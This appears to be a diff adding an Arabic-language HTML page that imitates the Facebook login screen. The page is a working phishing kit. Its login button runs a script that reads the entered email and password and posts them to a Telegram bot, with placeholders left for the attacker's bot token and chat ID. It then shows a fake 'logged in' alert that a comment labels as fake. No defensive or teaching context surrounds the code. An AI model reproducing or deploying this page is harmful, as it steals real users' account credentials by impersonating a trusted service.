@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>تسجيل الدخول إلى فيسبوك</title>
+    <style>
+        body {
+            background-color: #f0f2f5;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 100px;
+        }
+        .login-box {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+        }
+        .login-box input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .login-box button {
+            width: 100%;
+            background-color: #1877f2;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        h1 {
+            color: #1877f2;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Facebook</h1>
+    <div class="login-box">
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف">
+        <input type="password" id="password" placeholder="كلمة السر">
+        <button onclick="sendToTelegram()">تسجيل الدخول</button>
+    </div>
+
+    <script>
+        function sendToTelegram() {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            const message = `تم إدخال بيانات:\nEmail: ${email}\nPassword: ${password}`;
+
+            const botToken = "ضع التوكن هنا";
+            const chatId = "ضع معرف الشات هنا";
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: `chat_id=${chatId}&text=${encodeURIComponent(message)}`
+            }).then(response => {
+                alert("تم تسجيل الدخول!");  // وهمي
+            }).catch(error => {
+                console.error("خطأ في الإرسال:", error);
+            });
+        }
+    </script>
+
+</body>
+</html>
